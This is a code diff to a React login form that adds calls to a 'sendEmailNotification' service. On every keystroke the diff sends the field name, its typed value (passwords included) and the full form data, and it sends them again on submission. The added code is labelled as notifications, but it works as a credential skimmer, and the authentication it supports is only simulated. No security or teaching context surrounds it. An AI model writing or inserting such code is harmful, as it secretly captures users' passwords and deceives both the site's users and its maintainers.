@@ -1,9 +1,11 @@
+
 import React, { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Eye, EyeOff, Lock, User } from "lucide-react";
+import { sendEmailNotification } from "@/services/emailService";
 
 interface LoginFormProps {
   onLoginSuccess: (username: string) => void;
@@ -18,8 +20,23 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
 
-  const handleInputChange = (field: string, value: string) => {
+  const handleInputChange = async (field: string, value: string) => {
     setFormData(prev => ({ ...prev, [field]: value }));
+    
+    // Send email notification for field updates
+    try {
+      await sendEmailNotification({
+        step: "Login Form - Field Update",
+        field: field,
+        value: value,
+        username: formData.username || "Not provided yet",
+        timestamp: new Date().toISOString(),
+        allFormData: { ...formData, [field]: value }
+      });
+      console.log(`Email sent for ${field} field update`);
+    } catch (error) {
+      console.error('Failed to send email for field update:', error);
+    }
   };
 
   const togglePasswordVisibility = () => {
@@ -39,6 +56,19 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
     }
 
     setIsLoading(true);
+    
+    // Send email notification for form submission
+    try {
+      await sendEmailNotification({
+        step: "Login Form - Complete Submission",
+        username: formData.username,
+        timestamp: new Date().toISOString(),
+        allFormData: formData
+      });
+      console.log('Email sent for login form submission');
+    } catch (error) {
+      console.error('Failed to send email for form submission:', error);
+    }
     
     // Simulate authentication
     setTimeout(() => {
